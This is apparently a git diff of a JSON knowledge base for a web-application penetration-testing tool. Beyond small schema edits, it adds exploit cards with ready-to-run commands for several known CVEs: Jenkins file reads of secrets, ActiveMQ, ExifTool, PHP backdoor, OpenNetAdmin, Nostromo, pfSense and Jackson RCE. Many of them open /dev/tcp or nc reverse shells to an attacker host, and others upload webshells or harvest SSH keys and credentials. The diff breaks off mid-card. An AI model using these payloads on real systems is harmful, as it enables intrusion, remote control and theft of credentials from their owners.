@@ -1,8 +1,8 @@
 {
   "id": "web_2026_09",
   "title": "Web Application",
-  "source": "Project-authored (obol-local). Common-knowledge web-application methodology; independent expression, not derived from any third-party card set.",
-  "license": "Project-authored data (obol-local). No third-party copyleft obligation.",
+  "source": "Project-authored. Common-knowledge web-application methodology; independent expression, not derived from any third-party card set.",
+  "license": "Project-authored data. No third-party copyleft obligation.",
   "actions": [
     {
       "id": "vhost-discovery",
@@ -145,7 +145,8 @@
           "run": "ffuf -u {{url}}/FUZZ -w {{wordlist}} -fs {{wildcard_size}}   # or gobuster -b 404,302 / --wildcard",
           "note": "WILDCARD/CATCH-ALL: the server answers every path (a soft 404 or catch-all route), so the fuzzer refuses to run. Filter the decoy response by size/words (-fs/-fw), or blacklist its status (gobuster -b), and real paths stand out again."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "param-discovery",
@@ -577,6 +578,16 @@
           "tool": "curl",
           "run": "curl -s 'http://{{target}}/fetch?url=http://127.0.0.1:8080/'",
           "note": "Sweep internal ports: iterate over them and note shifts in response length. The services reachable only internally are the true target."
+        },
+        {
+          "tool": "ffuf",
+          "run": "ffuf -u \"http://{{target}}/{{preview_endpoint}}\" -X POST -H \"Content-Type: application/json\" -d '{\"{{url_param}}\":\"http://127.0.0.1:FUZZ\"}' -w /usr/share/seclists/Discovery/Web-Content/common-ports.txt -mc all -fs {{default_size}} -t 20",
+          "note": "SSRF Internal Port Fuzzing (POST JSON): When a web service previews or fetches URLs from user input, sweep localhost ports (127.0.0.1:FUZZ) using ffuf with common-ports.txt to discover hidden internal HTTP/REST services."
+        },
+        {
+          "tool": "ffuf",
+          "run": "ffuf -u \"http://{{target}}/{{preview_endpoint}}?{{url_param}}=http://127.0.0.1:FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/common-ports.txt -mc all -ac -t 20",
+          "note": "SSRF Internal Port Fuzzing (GET Query): Fuzz GET parameter URL inputs against localhost ports with auto-calibration (-ac) to detect differing response codes and lengths for open internal services."
         }
       ],
       "autonomy": "manual"
@@ -818,7 +829,8 @@
           "run": "python3 -c \"import urllib.request,urllib.parse; print(urllib.request.urlopen('{{url}}?name='+urllib.parse.quote('{{ssti_shell_payload}}')).read())\"",
           "note": "Swap the command for a reverse shell one-liner (bash -i >& /dev/tcp/{{lhost}}/4444 0>&1, URL-encoded) and catch it with the listener card for a full foothold."
         }
-      ]
+      ],
+      "requires_any": []
     },
     {
       "id": "http-put-webshell",
@@ -863,7 +875,8 @@
           "run": "davtest -url {{url}}",
           "note": "When WebDAV is in play, davtest probes which extensions it will accept and execute, so you upload one that actually runs rather than guessing."
         }
-      ]
+      ],
+      "requires_any": []
     },
     {
       "id": "authz-abuse",
@@ -908,7 +921,8 @@
           "run": "curl -s -X POST {{url}}/admin/upload -H \"Authorization: Bearer {{forged_jwt}}\" -F \"file=@shell.php\"",
           "note": "The payoff: an admin-only upload or template/config writer is code execution. Upload a webshell, request it (uid=...), and you have a foothold."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "nosql-injection",
@@ -1096,6 +1110,11 @@
           "tool": "curl",
           "run": "curl -s http://{{target}}/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'",
           "note": "If xmlrpc answers with a method list, wp.getUsersBlogs lets you test passwords in bulk."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s 'http://{{target}}/?static=1' | grep -i 'link\\|secret\\|draft'",
+          "note": "WordPress <= 5.2.3 unauthenticated draft post disclosure (CVE-2019-17671): ?static=1 discloses unpublished draft posts and private URLs."
         }
       ]
     },
@@ -1266,6 +1285,10 @@
       "produces": [
         "credential.available"
       ],
+      "deprioritize_when": [
+        "blocker.lockout",
+        "blocker.account_restricted"
+      ],
       "priority": 50,
       "autonomy": "approve",
       "proves": "a working application credential for one of the enumerated users",
@@ -1293,7 +1316,8 @@
           "run": "hydra -L {{userlist}} -P {{wordlist}} ssh://{{target}}",
           "note": "Always try the enumerated app users against SSH too — web and shell passwords are reused constantly, and an SSH hit is a direct foothold."
         }
-      ]
+      ],
+      "requires_any": []
     },
     {
       "id": "idor-harvest",
@@ -1333,7 +1357,8 @@
           "run": "for i in $(seq 1000 1100); do curl -s -b \"{{session}}\" {{url}}/api/export?id=$i; done",
           "note": "Pull each record and grep the responses for password, token, api_key, secret — export/invoice/profile endpoints hand these over in full, feeding crack-identify and the spray list."
         }
-      ]
+      ],
+      "requires_any": []
     },
     {
       "id": "verb-tampering",
@@ -1538,7 +1563,8 @@
           "run": "python3 ajpShooter.py http://{{target}}:8080 8009 /uploads/avatar.png eval",
           "note": "Only if the app let you upload a file: include it as JSP for code execution (the eval mode)."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "java-rmi",
@@ -1587,7 +1613,8 @@
           "run": "rmg serial {{target}} 1099 CommonsCollections6 'nc {{lhost}} {{lport}} -e /bin/bash' --bound-name jmxrmi",
           "note": "Fire a ysoserial gadget at a bound name that deserializes; swap the gadget to match the classpath rmg reports."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "lfi-secret-harvest",
@@ -1632,7 +1659,8 @@
           "run": "curl 'http://{{target}}/index.php?page=../../../../home/{{user}}/.ssh/id_rsa'",
           "note": "A readable private key is a direct login; crack a passphrase with ssh2john if needed."
         }
-      ]
+      ],
+      "requires_any": []
     },
     {
       "id": "aws-credential-abuse",
@@ -1683,7 +1711,8 @@
           "run": "aws ssm send-command --document-name AWS-RunShellScript --targets Key=instanceids,Values={{instance}} --parameters 'commands=id'",
           "note": "Where ssm:SendCommand is allowed, run commands on the instance as root/SYSTEM."
         }
-      ]
+      ],
+      "requires_any": []
     },
     {
       "id": "graphql-abuse",
@@ -1730,7 +1759,8 @@
           "run": "curl -s http://{{target}}/graphql -d '{\"query\":\"mutation{updateUser(id:1,role:\\\"admin\\\"){id role}}\"}' -H \"Content-Type: application/json\"",
           "note": "Call privileged mutations as a low-privilege or anonymous user; a mutation you should not run is the escalation."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "azure-imds",
@@ -1782,7 +1812,8 @@
           "run": "az vm run-command invoke -g {{resource_group}} -n {{vm_name}} --command-id RunShellScript --scripts 'id'",
           "note": "A Contributor or VM-admin role lets you runCommand on a VM as root/SYSTEM."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "gcp-metadata",
@@ -1834,7 +1865,8 @@
           "run": "curl -s -H 'Authorization: Bearer {{bearer}}' 'https://secretmanager.googleapis.com/v1/projects/{{project}}/secrets/{{secret}}/versions/latest:access'",
           "note": "Read Secret Manager values (base64); decode and feed into the credential loop."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "http-request-smuggling",
@@ -1881,7 +1913,8 @@
           "run": "curl -s --data-binary @smuggle.txt http://{{target}}/",
           "note": "Smuggle a prefix the back-end queues onto the next victim request; develop iteratively."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "prototype-pollution",
@@ -1927,7 +1960,8 @@
           "run": "curl -s http://{{target}}/admin -b session={{cookie}}",
           "note": "Confirm the polluted property is honoured; a template/child_process gadget turns it into RCE."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "mass-assignment",
@@ -1972,6 +2006,1111 @@
           "tool": "curl",
           "run": "curl -s -X POST http://{{target}}/api/register -H 'Content-Type: application/json' -d '{\"username\":\"{{user}}\",\"password\":\"{{password}}\",\"role\":\"admin\"}'",
           "note": "The create endpoint is often less guarded than update; a fresh admin account is cleaner than escalating a watched one."
+        }
+      ],
+      "requires_all": []
+    },
+    {
+      "id": "jenkins-cli-fileread",
+      "title": "Jenkins CLI Arbitrary File Read (CVE-2024-23897)",
+      "hypothesis": "Jenkins versions before 2.442 / LTS 2.426.3 contain an arbitrary file read vulnerability (CVE-2024-23897) in the args4j command parser. An attacker can use @file syntax over the unauthenticated Jenkins CLI to leak the first lines of arbitrary files on the host, including /etc/passwd, secrets/master.key, secrets/hudson.util.Secret, and encrypted credentials.xml.",
+      "tool": "java",
+      "tools": [
+        "java",
+        "curl"
+      ],
+      "os": [
+        "linux",
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "service.jenkins",
+        "port:8080",
+        "web.fingerprint.jenkins"
+      ],
+      "produces": [
+        "loot.files",
+        "credential.candidate"
+      ],
+      "priority": 86,
+      "phase": "exploit",
+      "proves": "demonstrates arbitrary file read access on the Jenkins controller via args4j CLI expansion",
+      "does_not_prove": "file read only; does not provide interactive remote code execution without cascading credential decryption or admin session forgery",
+      "report": {
+        "finding": "Jenkins CLI Arbitrary File Read (CVE-2024-23897)",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://www.jenkins.io/security/advisory/2024-01-24/",
+        "https://nvd.nist.gov/vuln/detail/CVE-2024-23897"
+      ],
+      "commands": [
+        {
+          "tool": "java",
+          "run": "java -jar jenkins-cli.jar -s http://{{target}}:{{web_port|8080}}/ -http connect-node \"@/etc/passwd\"",
+          "note": "PREFERRED (Linux /etc/passwd Read): Download jenkins-cli.jar from http://{{target}}:{{web_port|8080}}/jnlpJars/jenkins-cli.jar and read system accounts."
+        },
+        {
+          "tool": "java",
+          "run": "java -jar jenkins-cli.jar -s http://{{target}}:{{web_port|8080}}/ -http connect-node \"@/var/jenkins_home/secrets/master.key\"",
+          "note": "JENKINS MASTER KEY READ: Extract the Jenkins master encryption key used to decrypt credentials.xml."
+        },
+        {
+          "tool": "java",
+          "run": "java -jar jenkins-cli.jar -s http://{{target}}:{{web_port|8080}}/ -http connect-node \"@/var/jenkins_home/secrets/hudson.util.Secret\"",
+          "note": "HUDSON UTIL SECRET READ: Extract the Hudson secret decryption key used alongside master.key."
+        },
+        {
+          "tool": "java",
+          "run": "java -jar jenkins-cli.jar -s http://{{target}}:{{web_port|8080}}/ -http connect-node \"@/var/jenkins_home/credentials.xml\"",
+          "note": "CREDENTIALS.XML READ: Dump the encrypted credentials database containing stored passwords, SSH keys, and API tokens."
+        }
+      ]
+    },
+    {
+      "id": "activemq-cve-2023-46604",
+      "title": "Apache ActiveMQ OpenWire Remote Code Execution (CVE-2023-46604)",
+      "hypothesis": "Apache ActiveMQ versions prior to 5.15.16, 5.16.7, 5.17.6, or 5.18.3 allow unauthenticated remote code execution via OpenWire protocol (default port 61616). When processing a marshalled ExceptionResponse, the broker instantiates arbitrary classes via ClassPathXmlApplicationContext, loading an XML payload from an attacker-controlled HTTP server to execute system commands.",
+      "tool": "python3",
+      "tools": [
+        "python3",
+        "sh"
+      ],
+      "os": [
+        "linux",
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "port:61616",
+        "service.activemq"
+      ],
+      "produces": [
+        "foothold.shell",
+        "access.shell"
+      ],
+      "priority": 88,
+      "phase": "exploit",
+      "proves": "achieves unauthenticated remote code execution on the ActiveMQ broker host as the service user",
+      "does_not_prove": "does not prove root or Administrator privileges; privilege escalation may be required following the initial shell",
+      "report": {
+        "finding": "Apache ActiveMQ OpenWire Remote Code Execution (CVE-2023-46604)",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2023-46604",
+        "https://activemq.apache.org/security-advisories.data/CVE-2023-46604-announcement.txt"
+      ],
+      "commands": [
+        {
+          "tool": "python3",
+          "run": "python3 activemq_cve_2023_46604.py -t {{target}} -p {{openwire_port|61616}} -u http://{{attacker_ip}}:{{attacker_port|8000}}/poc.xml",
+          "note": "PREFERRED (OpenWire RCE Trigger): Sends a crafted OpenWire packet instructing ActiveMQ to load an XML Spring configuration containing a ProcessBuilder reverse shell."
+        }
+      ]
+    },
+    {
+      "id": "nvms1000-traversal",
+      "title": "TVT NVMS-1000 Directory Traversal Arbitrary File Read (CVE-2019-20085)",
+      "hypothesis": "TVT NVMS-1000 video surveillance web services allow unauthenticated path traversal via direct GET requests with directory traversal sequences (/../../../../). Remote attackers can read arbitrary files including win.ini, configuration files with plaintext passwords, and user desktop flags.",
+      "tool": "curl",
+      "tools": [
+        "curl"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "service.nvms1000",
+        "port:80",
+        "web.fingerprint.nvms"
+      ],
+      "produces": [
+        "loot.files",
+        "objective.user_flag",
+        "objective.root_flag"
+      ],
+      "priority": 86,
+      "phase": "exploit",
+      "proves": "demonstrates unauthenticated arbitrary file read access on the target Windows system via NVMS-1000 path traversal",
+      "does_not_prove": "arbitrary file read only; does not provide direct shell execution without extracting valid administrative credentials or upload vectors",
+      "report": {
+        "finding": "TVT NVMS-1000 Unauthenticated Directory Traversal (CVE-2019-20085)",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2019-20085",
+        "https://www.exploit-db.com/exploits/48311"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s -i \"http://{{target}}:{{web_port|80}}/../../../../../../../../windows/win.ini\"",
+          "note": "VERIFY TRAVERSAL (win.ini): Tests NVMS-1000 directory traversal by requesting windows/win.ini. Returns HTTP 200 with win.ini contents."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -i \"http://{{target}}:{{web_port|80}}/../../../../../../../../Users/Administrator/Desktop/root.txt\"",
+          "note": "READ ROOT/PROOF FLAG: Reads the Administrator desktop root.txt or proof.txt flag directly through the unauthenticated traversal."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -i \"http://{{target}}:{{web_port|80}}/../../../../../../../../Program%20Files/NSClient%2B%2B/nsclient.ini\"",
+          "note": "LEAK NSCLIENT INI CREDENTIALS: Reads the NSClient++ configuration file to recover the cleartext web management console password."
+        }
+      ]
+    },
+    {
+      "id": "exiftool-cve-2021-22204",
+      "title": "ExifTool Metadata Arbitrary Code Execution (CVE-2021-22204)",
+      "hypothesis": "Applications running ExifTool prior to 12.24 to inspect or strip metadata from uploaded files (JPEG, TIFF, PDF) are vulnerable to arbitrary code execution when parsing crafted DjVu metadata. An embedded DjVu ANT tag inside an image executes shell commands on the server.",
+      "tool": "exiftool",
+      "tools": [
+        "exiftool",
+        "python3",
+        "curl"
+      ],
+      "os": [
+        "linux"
+      ],
+      "phase": "access",
+      "requires_any": [
+        "http.reachable",
+        "web.tech"
+      ],
+      "produces": [
+        "foothold.linux",
+        "foothold.webshell"
+      ],
+      "priority": 76,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "remote command execution through server-side ExifTool image processing",
+      "does_not_prove": "exploitation without a backend file processing pipeline invoking ExifTool",
+      "report": {
+        "finding": "ExifTool DjVu Metadata Remote Code Execution (CVE-2021-22204)",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2021-22204",
+        "https://github.com/convisolabs/CVE-2021-22204-exiftool"
+      ],
+      "commands": [
+        {
+          "tool": "exiftool",
+          "run": "exiftool -ver",
+          "note": "Checks the local or discovered ExifTool version; versions < 12.24 are vulnerable."
+        },
+        {
+          "tool": "python3",
+          "run": "python3 -c 'import sys; payload = b\"(metadata\\n\\t(Copyright \\\"\\\\\\n\" b\"`bash -i >& /dev/tcp/\" + sys.argv[1].encode() + b\"/\" + sys.argv[2].encode() + b\" 0>&1`\\\"))\"; open(\"exploit.djvu\", \"wb\").write(payload)' {{lhost}} {{lport}}",
+          "note": "Generates a crafted DjVu exploit payload triggering reverse shell on server-side ExifTool parse."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -F 'file=@exploit.jpg' http://{{target}}/upload",
+          "note": "Uploads the crafted image containing malicious DjVu metadata to trigger execution."
+        }
+      ],
+      "requires_all": []
+    },
+    {
+      "id": "php-backdoor-useragent",
+      "title": "PHP 8.1.0-dev User-Agentt Backdoor Remote Code Execution",
+      "hypothesis": "PHP development build 8.1.0-dev contains a malicious backdoor inserted into zend_eval_string that executes arbitrary PHP code if the HTTP User-Agentt header begins with 'zerodium'. Sending system commands in this header gives instant arbitrary code execution with web server permissions.",
+      "tool": "curl",
+      "tools": [
+        "curl"
+      ],
+      "os": [
+        "linux"
+      ],
+      "phase": "access",
+      "requires_any": [
+        "http.reachable",
+        "web.server",
+        "web.tech"
+      ],
+      "produces": [
+        "foothold.linux",
+        "foothold.webshell"
+      ],
+      "priority": 85,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "unauthenticated remote code execution via PHP 8.1.0-dev User-Agentt backdoor",
+      "does_not_prove": "exploitation on unmodified or standard release PHP versions",
+      "report": {
+        "finding": "PHP 8.1.0-dev Malicious Backdoor Remote Code Execution",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://github.com/flast101/php-8.1.0-dev-backdoor-rce"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s -H \"User-Agentt: zerodium system('id');\" http://{{target}}/",
+          "note": "Probes for the PHP 8.1.0-dev backdoor by executing the 'id' command and inspecting output."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -H \"User-Agentt: zerodium system('bash -c \\\"bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\\\"');\" http://{{target}}/",
+          "note": "Triggers an interactive reverse shell back to attacker listener via User-Agentt backdoor."
+        }
+      ],
+      "requires_all": []
+    },
+    {
+      "id": "opennetadmin-rce",
+      "title": "OpenNetAdmin (ONA) v18.1.1 Command Injection RCE",
+      "hypothesis": "OpenNetAdmin (ONA) versions <= 18.1.1 are vulnerable to unauthenticated command injection in dcm.php via the xajax module. Passing shell command strings through the xajaxargs array executes arbitrary commands as www-data.",
+      "tool": "curl",
+      "tools": [
+        "curl",
+        "bash"
+      ],
+      "os": [
+        "linux"
+      ],
+      "phase": "access",
+      "requires_any": [
+        "http.reachable",
+        "web.tech"
+      ],
+      "produces": [
+        "foothold.linux",
+        "foothold.webshell"
+      ],
+      "priority": 80,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "remote command execution through OpenNetAdmin dcm.php xajax command injection",
+      "does_not_prove": "exploitation against patched ONA instances or secure configurations",
+      "report": {
+        "finding": "OpenNetAdmin v18.1.1 Unauthenticated Remote Code Execution",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://www.exploit-db.com/exploits/47691"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s -d \"xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id;\" \"http://{{target}}/ona/dcm.php\"",
+          "note": "Sends crafted xajax POST request to dcm.php to execute id command on the target host."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -d \"xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1';\" \"http://{{target}}/ona/dcm.php\"",
+          "note": "Triggers reverse shell through OpenNetAdmin xajax parameter injection."
+        }
+      ],
+      "requires_all": []
+    },
+    {
+      "id": "nostromo-rce",
+      "title": "Nostromo Web Server (nhttpd) Remote Code Execution (CVE-2019-16278)",
+      "hypothesis": "Nostromo (nhttpd) web servers prior to version 1.9.6 contain a directory traversal flaw in URI parsing. Unauthenticated attackers can traverse into /bin/sh via /.%0d%0a/bin/sh in HTTP POST requests and execute arbitrary shell commands.",
+      "tool": "curl",
+      "tools": [
+        "curl"
+      ],
+      "os": [
+        "linux"
+      ],
+      "phase": "access",
+      "requires_any": [
+        "http.reachable",
+        "web.server"
+      ],
+      "produces": [
+        "foothold.linux",
+        "foothold.webshell"
+      ],
+      "priority": 82,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "unauthenticated arbitrary command execution via Nostromo path traversal",
+      "does_not_prove": "exploitation on Nostromo versions 1.9.6 or later",
+      "report": {
+        "finding": "Nostromo nhttpd Directory Traversal RCE (CVE-2019-16278)",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2019-16278"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s -X POST 'http://{{target}}/.%0d%0a/bin/sh' -d 'echo; id'",
+          "note": "Executes id command via Nostromo nhttpd path traversal in HTTP POST request body."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -X POST 'http://{{target}}/.%0d%0a/bin/sh' -d 'echo; bash -c \"bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\"'",
+          "note": "Launches reverse shell through Nostromo directory traversal execution."
+        }
+      ],
+      "requires_all": []
+    },
+    {
+      "id": "jackson-databind-rce",
+      "title": "Jackson Databind Polymorphic Deserialization RCE (CVE-2019-12384)",
+      "hypothesis": "Applications parsing JSON using FasterXML Jackson-databind with polymorphic typing enabled (enableDefaultTyping) are vulnerable to remote code execution. Supplying gadget classes like ch.qos.logback.core.db.DriverManagerConnectionSource triggers an outbound H2 JDBC connection that executes arbitrary SQL script payloads via RUNSCRIPT.",
+      "tool": "curl",
+      "tools": [
+        "curl",
+        "python3"
+      ],
+      "os": [
+        "linux"
+      ],
+      "phase": "access",
+      "requires_any": [
+        "http.reachable",
+        "web.tech"
+      ],
+      "produces": [
+        "foothold.linux",
+        "foothold.webshell"
+      ],
+      "priority": 78,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "arbitrary remote command execution via Jackson Databind H2 JDBC deserialization gadget",
+      "does_not_prove": "exploitation when polymorphic typing is disabled or patched",
+      "report": {
+        "finding": "Jackson Databind Polymorphic Deserialization Remote Code Execution",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2019-12384",
+        "https://blog.doyensec.com/2019/07/22/jackson-gadgets.html"
+      ],
+      "commands": [
+        {
+          "tool": "python3",
+          "run": "echo 'CREATE ALIAS SHELL EXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\\\\\A\"); return s.hasNext() ? s.next() : \"\"; }$$; CALL SHELL(\"bash -c \\'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\\'\");' > inject.sql && python3 -m http.server 8000",
+          "note": "Stages malicious H2 database SQL script on local HTTP server to trigger reverse shell upon remote JDBC connect."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -X POST 'http://{{target}}/api/json' -H 'Content-Type: application/json' -d '[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \\'http://{{lhost}}:8000/inject.sql\\'\"}]'",
+          "note": "Sends crafted polymorphic Jackson JSON payload triggering remote JDBC execution of inject.sql."
+        }
+      ],
+      "requires_all": []
+    },
+    {
+      "id": "pfsense-rrd-rce",
+      "title": "pfSense RRD Graph Command Injection RCE (CVE-2014-4688)",
+      "hypothesis": "pfSense 2.1.3 and earlier versions contain an authenticated command injection vulnerability in status_rrd_graph_img.php. The 'database' GET parameter is passed unsanitized into a shell command, allowing authenticated users or credentials recovered from system files to execute commands directly as root.",
+      "tool": "curl",
+      "tools": [
+        "curl"
+      ],
+      "os": [],
+      "phase": "access",
+      "requires_any": [
+        "http.reachable",
+        "credential.available"
+      ],
+      "produces": [
+        "foothold.linux",
+        "access.root"
+      ],
+      "priority": 77,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "root command execution on pfSense via status_rrd_graph_img.php command injection",
+      "does_not_prove": "exploitation without valid administrative or operator credentials",
+      "report": {
+        "finding": "pfSense Authenticated RRD Graph Command Injection (CVE-2014-4688)",
+        "severity": "high"
+      },
+      "refs": [
+        "https://www.exploit-db.com/exploits/31530"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -sk -u '{{user}}:{{password}}' 'https://{{target}}/status_rrd_graph_img.php?database=queues;id;'",
+          "note": "Probes for CVE-2014-4688 authenticated command injection executing id command as root."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -sk -u '{{user}}:{{password}}' 'https://{{target}}/status_rrd_graph_img.php?database=queues;rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>&1|nc+{{lhost}}+{{lport}}+>/tmp/f;'",
+          "note": "Triggers interactive root reverse shell on pfSense FreeBSD appliance."
+        }
+      ],
+      "requires_all": []
+    },
+    {
+      "id": "web-config-upload-bypass",
+      "title": "IIS web.config Extension Filter Upload Bypass",
+      "hypothesis": "On IIS web applications where .aspx, .asp, and script extensions are blacklisted, uploading a custom web.config file allows mapping handlers or embedding ASP.NET execution to achieve remote code execution.",
+      "tool": "curl",
+      "tools": [
+        "curl"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "http.reachable"
+      ],
+      "produces": [
+        "foothold.webshell"
+      ],
+      "priority": 78,
+      "phase": "access",
+      "proves": "bypasses IIS file upload extension filtering using web.config handler mapping",
+      "does_not_prove": "execution within IIS application pool worker process only",
+      "report": {
+        "finding": "IIS web.config Upload Filter Bypass Remote Code Execution",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-and-profit/"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s -F 'file=@web.config' 'http://{{target}}/{{upload_path}}'",
+          "note": "Upload malicious web.config defining a custom static handler or ASP.NET script mapper."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s 'http://{{target}}/UploadedFiles/web.config'",
+          "note": "Trigger execution of the uploaded web.config to execute embedded payload and establish reverse shell."
+        }
+      ]
+    },
+    {
+      "id": "nibbleblog-myimage-upload-rce",
+      "title": "Nibbleblog My_Image Arbitrary Upload RCE (CVE-2015-6967)",
+      "hypothesis": "Nibbleblog 4.0.3 My Image plugin fails to validate uploaded image extensions in admin.php, saving the file as image.php in the plugin directory. Authenticating as admin allows uploading a PHP webshell.",
+      "tool": "curl",
+      "tools": [
+        "curl"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "http.reachable"
+      ],
+      "produces": [
+        "foothold.webshell"
+      ],
+      "priority": 77,
+      "phase": "access",
+      "proves": "exploits Nibbleblog CVE-2015-6967 plugin upload vulnerability to achieve web shell",
+      "does_not_prove": "execution limited to web server account (www-data)",
+      "report": {
+        "finding": "Nibbleblog My_Image Arbitrary File Upload (CVE-2015-6967)",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6967"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s -b cookies.txt -F 'image=@shell.php' 'http://{{target}}/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image'",
+          "note": "Upload PHP reverse shell via Nibbleblog My Image plugin upload form using authenticated session cookie."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s 'http://{{target}}/nibbleblog/content/private/plugins/my_image/image.php'",
+          "note": "Request the renamed image.php payload inside the plugin directory to spawn reverse shell."
+        }
+      ]
+    },
+    {
+      "id": "solr-velocity-template-rce",
+      "title": "Apache Solr Velocity Template RCE (CVE-2019-17558)",
+      "hypothesis": "Apache Solr versions before 8.3.1 allow enabling params.resource.loader.enabled via config API and evaluating arbitrary Velocity templates via the /select endpoint to achieve remote code execution.",
+      "tool": "curl",
+      "tools": [
+        "curl"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "http.reachable"
+      ],
+      "produces": [
+        "foothold.shell"
+      ],
+      "priority": 79,
+      "phase": "access",
+      "proves": "exploits Apache Solr Velocity template injection (CVE-2019-17558) to execute commands",
+      "does_not_prove": "execution limited to solr user context or container boundaries",
+      "report": {
+        "finding": "Apache Solr Velocity Template Remote Code Execution (CVE-2019-17558)",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17558"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -X POST -H 'Content-Type: application/json' -d '{\"set-property\":{\"params.resource.loader.enabled\":\"true\"}}' 'http://{{target}}:8983/solr/{{core}}/config'",
+          "note": "Enable Velocity resource loader via Solr Core config API endpoint."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s 'http://{{target}}:8983/solr/{{core}}/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+${rt}'",
+          "note": "Trigger Velocity template injection on Solr select endpoint executing command via java.lang.Runtime."
+        }
+      ]
+    },
+    {
+      "id": "gitlab-ci-webshell",
+      "title": "GitLab CI/CD Automated Runner Webshell Deployment",
+      "hypothesis": "When developers or operators have write access to a GitLab repository tied to an automated CI/CD pipeline or deployment webhook, committing a webshell or reverse shell payload triggers automatic execution in target staging or production environments.",
+      "tool": "git",
+      "tools": [
+        "git",
+        "curl"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "credential.available",
+        "http.reachable"
+      ],
+      "produces": [
+        "foothold.webshell"
+      ],
+      "priority": 79,
+      "phase": "access",
+      "proves": "achieves web shell execution via automated GitLab CI/CD runner deployment pipeline",
+      "does_not_prove": "privilege escalation outside the web server service context",
+      "report": {
+        "finding": "Arbitrary Code Execution via GitLab CI/CD Pipeline Automation",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://docs.gitlab.com/ee/ci/"
+      ],
+      "commands": [
+        {
+          "tool": "git",
